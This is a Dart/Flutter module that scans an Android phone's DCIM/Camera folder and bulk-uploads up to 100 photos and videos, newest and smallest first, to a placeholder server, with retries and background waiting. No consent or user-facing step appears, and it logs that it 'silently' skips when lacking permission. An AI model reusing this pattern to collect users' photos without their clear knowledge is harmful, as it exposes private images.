/// DCIM 逐文件上传管理器（高速版）
/// - ★ 复用 http.Client 连接池，keep-alive 生效
/// - ★ 并发度 4-8（I/O 密集，不受 CPU 限制）
/// - 批内并发，批间串行
/// - 图片 > 30MB / 视频 > 80MB 跳过
/// - 服务器不可达不累加计数
/// - 所有失败自动重试
/// - 小文件优先 + 新的优先
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────────────
class DcimUploadConfig {
  final String uploadUrl;
  final String dcimPath;
  final Duration uploadTimeout;
  final int maxFiles;

  final Set<String> imageExtensions;
  final Set<String> videoExtensions;

  final int maxImageBytes;
  final int maxVideoBytes;

  /// 并发度。0 = 自动（CPU 核心数，clamp 4-8）；N = 固定 N
  final int concurrency;

  /// 小文件阈值
  final int smallFileBytes;

  final String healthCheckUrl;
  final Duration healthCheckTimeout;
  final Duration serverWaitInterval;
  final int serverWaitMaxAttempts;

  const DcimUploadConfig({
    this.uploadUrl = 'https://your-domain.com/api/upload/dcim',
    this.dcimPath = '/storage/emulated/0/DCIM/Camera',
    this.uploadTimeout = const Duration(minutes: 5),
    this.maxFiles = 100,

    this.imageExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
    },
    this.videoExtensions = const {
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    },

    this.maxImageBytes = 30 * 1024 * 1024,
    this.maxVideoBytes = 80 * 1024 * 1024,

    this.concurrency = 0,

    this.smallFileBytes = 5 * 1024 * 1024,

    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    this.serverWaitMaxAttempts = 180,
  });
}

// ── 单例管理器 ───────────────────────────────────────────────────────────────
class DcimUploadManager {
  DcimUploadManager._internal();

  static final DcimUploadManager instance = DcimUploadManager._internal();

  static const String _kUploaded = 'dcim_uploaded_paths';

  DcimUploadConfig _config = const DcimUploadConfig();
  SharedPreferences? _prefs;

  final Set<String> _uploaded = <String>{};

  bool _busy = false;
  bool get isBusy => _busy;
  int get uploadedCount => _uploaded.length;

  // ★ 全局 http.Client（连接池复用），懒加载
  http.Client? _client;

  http.Client get client {
    _client ??= _createClient();
    return _client!;
  }

  http.Client _createClient() {
    final io = HttpClient();
    io.maxConnectionsPerHost = 16;
    io.idleTimeout = const Duration(seconds: 30);
    io.connectionTimeout = const Duration(seconds: 15);
    io.autoUncompress = false;
    return IOClient(io);
  }

  /// 释放资源（App 退出时可选调用）
  void dispose() {
    try {
      _client?.close();
      _client = null;
    } catch (_) {}
  }

  // ── 初始化 ─────────────────────────────────────────────────────────
  Future<void> initialize({DcimUploadConfig? config}) async {
    if (_prefs != null) return;
    if (config != null) _config = config;
    _prefs = await SharedPreferences.getInstance();

    _uploaded
      ..clear()
      ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);

    debugPrint('[DcimUpload] 已记录成功 ${_uploaded.length} 个');
  }

  // ── 权限判断 ───────────────────────────────────────────────────────
  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;
    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      final images = await Permission.photos.status;
      final videos = await Permission.videos.status;
      return (images.isGranted || images.isLimited) &&
          (videos.isGranted || videos.isLimited);
    } else {
      return (await Permission.storage.status).isGranted;
    }
  }

  Future<void> startUploadIfPermitted() async {
    await initialize();
    if (!await hasPermission()) {
      debugPrint('[DcimUpload] 无权限，静默跳过');
      return;
    }
    final scanned = await scanFiles();
    await uploadAll(scanned);
  }

  /// 并发度：CPU 核心数（clamp 4-8）
  int _resolveConcurrency() {
    if (_config.concurrency > 0) {
      return _config.concurrency.clamp(1, 16);
    }
    final cores = Platform.numberOfProcessors;
    return cores.clamp(4, 8);
  }

  // ══════════════════════════════════════════════════════════════════
  // 主流程
  // ══════════════════════════════════════════════════════════════════
  Future<void> uploadAll(List<_Scanned> scanned) async {
    if (_busy) {
      debugPrint('[DcimUpload] 上一轮未结束，跳过');
      return;
    }

    final filtered = scanned
        .where((s) => !_uploaded.contains(s.file.path))
        .toList();

    if (filtered.isEmpty) {
      debugPrint('[DcimUpload] 无可上传文件');
      return;
    }

    _busy = true;
    try {
      final concurrency = _resolveConcurrency();
      final total = filtered.length;
      final batchCount = (total + concurrency - 1) ~/ concurrency;

      debugPrint('[DcimUpload] 共 $total 个文件，'
          '并发度 $concurrency，分 $batchCount 批串行');

      // 服务器检测
      debugPrint('[DcimUpload] 进入服务器检测循环...');
      final serverOk = await _waitForServer();
      if (!serverOk) {
        debugPrint('[DcimUpload] ❌ 服务器不可达，放弃本轮');
        return;
      }

      final sw = Stopwatch()..start();
      int okTotal = 0;
      int failTotal = 0;
      int processed = 0;

      // 分批
      for (int i = 0; i < total; i += concurrency) {
        if (!_busy) {
          debugPrint('[DcimUpload] 已取消，中止');
          break;
        }

        final end = (i + concurrency < total) ? i + concurrency : total;
        final batch = filtered.sublist(i, end);
        final batchNum = (i ~/ concurrency) + 1;

        debugPrint('[DcimUpload] ═══ 批次 $batchNum/$batchCount '
            '(${batch.length} 个) ═══');

        // 批内并发
        final results = await Future.wait(
          batch.map((s) => _uploadOne(s)),
        );

        int batchOk = 0;
        for (int j = 0; j < batch.length; j++) {
          if (results[j]) {
            _uploaded.add(batch[j].file.path);
            batchOk++;
            okTotal++;
          } else {
            failTotal++;
          }
        }

        processed += batch.length;
        await _persist();

        debugPrint('[DcimUpload] 批次 $batchNum 完成: '
            '成功 $batchOk, 失败 ${batch.length - batchOk}, '
            '进度 $processed/$total');

        // 熔断：整批全失败 → 中止
        if (batchOk == 0) {
          debugPrint('[DcimUpload] 🛑 整批失败，中止本轮');
          break;
        }
      }

      sw.stop();
      final totalMB =
          filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
      final elapsedSec = sw.elapsedMilliseconds / 1000;
      final speed = elapsedSec > 0 ? totalMB / elapsedSec : 0.0;

      debugPrint('[DcimUpload] ══════════ 全部完成 ══════════');
      debugPrint('[DcimUpload] 成功 $okTotal, 失败 $failTotal, '
          '共 ${totalMB.toStringAsFixed(1)} MB, '
          '耗时 ${elapsedSec.toStringAsFixed(1)}s, '
          '平均 ${speed.toStringAsFixed(2)} MB/s');
    } catch (e, st) {
      debugPrint('[DcimUpload] ❌ 主流程异常: $e\n$st');
    } finally {
      _busy = false;
    }
  }

  // ── 单文件上传 ─────────────────────────────────────────────────────
  Future<bool> _uploadOne(_Scanned scanned) async {
    final file = scanned.file;
    final name = file.path.split('/').last;

    try {
      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
      req.files.add(await http.MultipartFile.fromPath('file', file.path));
      req.fields['fileName'] = name;

      // ★ 用全局 client.send，keep-alive 生效
      final streamed = await client
          .send(req)
          .timeout(_config.uploadTimeout);

      final code = streamed.statusCode;
      await streamed.stream.drain<void>();

      if (code >= 200 && code < 300) {
        debugPrint('[DcimUpload] ✅ $name');
        return true;
      }
      debugPrint('[DcimUpload] ⚠️ $name HTTP $code（下次重试）');
      return false;
    } on TimeoutException {
      debugPrint('[DcimUpload] ⏱ $name 超时（'
          '${_config.uploadTimeout.inSeconds}s，下次重试）');
      return false;
    } catch (e) {
      debugPrint('[DcimUpload] ⚠️ $name 网络错误: $e（下次重试）');
      return false;
    }
  }

  // ── 服务器检测 ─────────────────────────────────────────────────────
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.uploadUrl);

    debugPrint('[DcimUpload] 健康检查 URL: $url');

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      if (!_busy) return false;

      if (await _pingServer(url)) {
        debugPrint('[DcimUpload] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }

      final shouldLog =
          i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
      if (shouldLog) {
        debugPrint('[DcimUpload] 服务器不可达（第 $i/'
            '${_config.serverWaitMaxAttempts} 次），'
            '${_config.serverWaitInterval.inSeconds}s 后重试...');
      }

      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }
    return false;
  }

  Future<bool> _pingServer(Uri url) async {
    try {
      final req = http.Request('HEAD', url);
      final streamed =
          await client.send(req).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {}

    try {
      final resp = await client.get(url).timeout(_config.healthCheckTimeout);
      return resp.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ── 扫描 ───────────────────────────────────────────────────────────
  Future<List<_Scanned>> scanFiles() async {
    final dir = Directory(_config.dcimPath);
    if (!await dir.exists()) return [];

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      final ext = name.substring(dot).toLowerCase();

      final isImage = _config.imageExtensions.contains(ext);
      final isVideo = _config.videoExtensions.contains(ext);
      if (!isImage && !isVideo) continue;

      if (_uploaded.contains(e.path)) continue;

      try {
        final st = await e.stat();
        final limit = isImage ? _config.maxImageBytes : _config.maxVideoBytes;
        if (limit > 0 && st.size > limit) {
          debugPrint('[DcimUpload] 跳过超大${isImage ? "图片" : "视频"}（'
              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
          continue;
        }
        list.add(_Scanned(e, st.modified, st.size));
      } catch (_) {}
    }

    // 小文件优先 + 新的优先
    final smallBytes = _config.smallFileBytes;
    list.sort((a, b) {
      final aSmall = a.size <= smallBytes;
      final bSmall = b.size <= smallBytes;
      if (aSmall != bSmall) return aSmall ? -1 : 1;
      return b.modified.compareTo(a.modified);
    });

    return list.take(_config.maxFiles).toList();
  }

  // ── 持久化 ─────────────────────────────────────────────────────────
  Future<void> _persist() async {
    await _prefs?.setStringList(_kUploaded, _uploaded.toList());
  }

  Future<void> reset() async {
    _uploaded.clear();
    await _prefs?.remove(_kUploaded);
    debugPrint('[DcimUpload] 记录已清空');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  final int size;
  _Scanned(this.file, this.modified, this.size);
}